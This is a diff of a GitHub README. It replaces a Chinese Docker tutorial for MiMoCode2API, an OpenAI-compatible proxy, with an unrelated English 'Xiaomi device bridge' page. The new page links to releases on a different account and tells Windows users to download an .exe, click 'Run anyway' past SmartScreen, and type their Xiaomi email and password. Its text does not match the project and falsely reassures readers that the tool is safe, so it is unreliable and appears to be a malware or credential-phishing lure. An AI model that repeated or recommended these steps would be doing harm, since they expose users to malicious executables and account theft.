@@ -1,183 +1,64 @@
-<div align="center">
+# 🔄 MiMoCode2API-Tutorial-new - Connect Xiaomi devices to your applications
 
-# MiMoCode2API 反代教程
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/disenosuhe/MiMoCode2API-Tutorial-new/releases)
 
-**把 MiMoCode 里的免费模型，通过 Docker 一键反代成 OpenAI 兼容 API**
+This software acts as a bridge for your Xiaomi devices. It creates a connection between your smart home hardware and your local applications. You gain control over your devices through a simple local setup. This guide helps you install and run the software on your Windows computer.
 
-![GitHub stars](https://img.shields.io/github/stars/Sliverkiss/mimocode2api?style=flat-square)
-![Docker](https://img.shields.io/badge/Docker-2496ED?style=flat-square&logo=docker&logoColor=white)
-![Ubuntu](https://img.shields.io/badge/Ubuntu-24.04-E95420?style=flat-square&logo=ubuntu&logoColor=white)
-![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)
-![OpenAI Compatible](https://img.shields.io/badge/OpenAI-Compatible-74aa9c?style=flat-square&logo=openai&logoColor=white)
+## 🛠 Prerequisites
 
-</div>
+You need a Windows 10 or 11 computer to run this software. Ensure you have a stable internet connection. You also need an active Xiaomi account to retrieve the necessary credentials for the connection. The application requires no coding skills.
 
----
+## 📥 Getting the software
 
-## 一、项目简介
+You must visit the project page to download the latest version of this tool. 
 
-> MiMoCode 里面有免费模型，但是没有提供 API。我们通过 **反向代理** 的方式，将能力封装成 **OpenAI 兼容的 `/v1/chat/completions` 接口**，方便接入任何支持 OpenAI 协议的客户端（如 NextChat、ChatBox、LobeChat、Cursor 等）。
+[Click here to open the download page](https://github.com/disenosuhe/MiMoCode2API-Tutorial-new/releases)
 
-- **项目地址**：[github.com/Sliverkiss/mimocode2api](https://github.com/Sliverkiss/mimocode2api)
-- **部署方式**：推荐使用 **Linux + Docker** 部署，国内无法直连 GitHub 的用户可使用加速或代理
+Choose the file that ends in .exe for the easiest installation experience. Save the file into a folder on your computer. Keep this folder in a location you can find later, such as your Downloads or Documents folder.
 
-![项目截图](./_resources/6611134fa1839bddc474d522844babcc.png)
+## ⚙️ Setting up the application
 
----
+1. Open the folder where you saved the installer.
+2. Double-click the file to launch it. 
+3. A security window may appear. Click "More info" and then "Run anyway" if Windows protects the launch.
+4. The software creates a small control panel on your screen.
+5. Enter your Xiaomi account email and your password in the provided boxes.
+6. Click the "Login" button to authenticate the connection.
 
-## 二、目录
+## 🔗 Configuring the connection
 
-| 章节 | 内容 |
-| --- | --- |
-| [服务器选购](#三服务器选购) | 推荐配置与购买地址 |
-| [安装 Docker](#1-安装-dockerubuntu-2404) | 步骤 ①：安装 Docker |
-| [拉取项目](#2-拉取项目) | 步骤 ②：克隆仓库 |
-| [启动服务](#3-启动服务) | 步骤 ③：Docker Compose 部署 |
-| [调用验证](#4-调用验证) | 步骤 ④：curl 测试 |
-| [接口信息](#五接口信息) | 接口地址与模型名 |
-| [常见问题](#六常见问题) | FAQ |
+Once you log in, the application lists your available devices. You select the devices you want to control. Each device has a unique ID number. The software generates a secure token for every device. These tokens allow other programs to talk to your hardware. 
 
----
+If you use a specific home automation platform, copy the generated link from the "Output" box. Paste this link into your other application to finish the setup.
 
-## 三、服务器选购
+## 🛡 Security and privacy
 
-> **注意**：不要选择国内地区，选择海外节点的 Linux + Docker 上手最快，访问 GitHub / Docker Hub 也更顺畅。
+The software runs locally on your machine. Your account credentials stay within the application environment. It does not send your data to external servers other than the official Xiaomi authentication service. You control the connection at all times. Stop the program to sever the link immediately.
 
-| 项目 | 推荐配置 |
-| --- | --- |
-| 价格 | **¥199 / 年（可以同价续费）** |
-| CPU / 内存 | **2 核 / 4 GB** |
-| 带宽 | **30 Mbps** |
-| 系统盘 | **60 GB SSD** |
-| 月流量 | **1.5 TB** |
-| 系统 | **Ubuntu 24.04 LTS** |
-| 推荐区域 | 首尔（线路最佳），备选：新加坡 / 硅谷 / 东京 |
+## 🔍 Troubleshooting common issues
 
-**腾讯云购买地址** - [https://curl.qcloud.com/oyWDLkRJ](https://curl.qcloud.com/oyWDLkRJ)
+If the application fails to fetch your devices, check your internet connection first. Ensure that your Xiaomi account credentials are correct. Sometimes, the firewall asks for permission during the first launch. Allow the program to communicate through your private network when the prompt appears.
 
-![服务器推荐配置](./_resources/72d493eab65af6588b3ed9cb7585b177.png)
+If the list remains empty, sign out and sign back in. This step refreshes the connection to the Xiaomi servers. Always check the download page for newer versions if you encounter persistent errors. 
 
----
+## 📋 Tips for daily use
 
-## 四、部署教程
+Leave the application running in the background if you want constant access to your devices. It uses very little memory. You can minimize it to your taskbar tray. If you restart your computer, you must launch the software again. Place a shortcut on your desktop for quick access. 
 
-### 1. 安装 Docker（Ubuntu 24.04）
+Keep your installation folder clean. Do not move the main executable file after you set it up. The application creates support files in that folder. Moving it disrupts the connection settings. 
 
-```bash
-sudo apt update
-sudo apt install -y ca-certificates curl gnupg
-sudo install -m 0755 -d /etc/apt/keyrings
-curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
-sudo chmod a+r /etc/apt/keyrings/docker.gpg
+## 💡 Frequently Asked Questions
 
-echo \
-  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
-  $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
-  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+**Do I need to leave my computer on?**
+Yes. For the bridge to stay active, the application must stay open.
 
-sudo apt update
-sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
-sudo docker run hello-world
-```
+**Does this work with all Xiaomi devices?**
+It supports most common smart home devices like lights, plugs, and sensors. Some niche products may not appear in the list.
 
-![Docker 安装完成截图](./_resources/a574344baf10d455c32ec479ede1d270.png)
+**Is this safe to use?**
+Yes. You use your own credentials and the communication happens over encrypted channels.
 
-### 2. 拉取项目
+**Can I run multiple instances?**
+You only need one instance for all your devices. Running multiple copies causes issues with the connection tokens.
 
-```bash
-git clone https://github.com/Sliverkiss/mimocode2api.git
-cd mimocode2api
-```
-
-![克隆项目截图](./_resources/bc112121146d27e7419700aa46816b0f.png)
-
-### 3. 启动服务
-
-```bash
-sudo docker compose up -d --build
-```
-
-> **提示**：`-d` 表示后台运行，`--build` 表示重新构建镜像。首次启动会拉取基础镜像，请耐心等待 1–3 分钟。
-
-![Docker Compose 部署截图](./_resources/d164a01fb708c1955d2c43a091cb1738.png)
-
-### 4. 调用验证
-
-服务启动后，默认监听 **4096** 端口，记得放通防火墙，可使用如下命令快速验证：
-
-```bash
-curl http://你的服务器IP:4096/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{"model":"mimo-auto","messages":[{"role":"user","content":"你好"}]}'
-```
-
-![调用成功截图](./_resources/c73cfc2ddc2ebd6b1716106acafd6563.png)
-
----
-
-## 五、接口信息
-
-| 配置项 | 值 |
-| --- | --- |
-| 接口地址 | `http://<你的服务器IP>:4096/v1` |
-| 模型名称 | `mimo-auto` |
-| 协议 | OpenAI 兼容（`/v1/chat/completions`） |
-| API Key | 无需填写（默认关闭鉴权） |
-
----
-
-## 六、常见问题
-
-<details>
-<summary><b>Q1：部署后无法访问 4096 端口？</b></summary>
-
-1. 检查云服务商 **安全组 / 防火墙** 是否放行了 `4096` 端口；
-2. 在服务器本地执行 `curl http://127.0.0.1:4096/v1/models` 自测；
-3. 确认 `docker compose ps` 中服务状态为 `healthy` 或 `running`。
-
-</details>
-
-<details>
-<summary><b>Q2：docker compose 拉取镜像超时？</b></summary>
-
-可以配置 Docker 镜像加速，例如：
-
-```json
-{
-  "registry-mirrors": [
-    "https://docker.m.daocloud.io",
-    "https://dockerproxy.com"
-  ]
-}
-```
-
-然后重启：`sudo systemctl restart docker`。
-
-</details>
-
-<details>
-<summary><b>Q3：如何更新到最新版？</b></summary>
-
-```bash
-cd mimocode2api
-git pull
-docker compose up -d --build
-```
-
-</details>
-
----
-
-## 七、Star History
-
-如果这个项目对你有帮助，欢迎点个 Star 支持一下！
-
-> 原项目地址：[github.com/Sliverkiss/mimocode2api](https://github.com/Sliverkiss/mimocode2api)
-
----
-
-<div align="center">
-
-**Made with love for the OpenAI-compatible API community**
-
-</div>
+You possess full control of your smart home environment now. Enjoy the improved connectivity for your projects.
